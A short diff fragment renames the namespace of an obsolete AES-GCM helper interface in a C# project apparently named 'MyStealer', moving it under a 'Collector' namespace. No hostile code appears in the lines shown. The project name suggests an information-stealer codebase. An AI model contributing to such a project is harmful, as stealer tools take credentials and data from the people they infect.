@@ -1,6 +1,6 @@
 using System;
 
-namespace MyStealer.Utils.BcAesGcm
+namespace MyStealer.Collector.Utils.BcAesGcm
 {
     [Obsolete("Will be removed")]
     public interface IGcmExponentiator
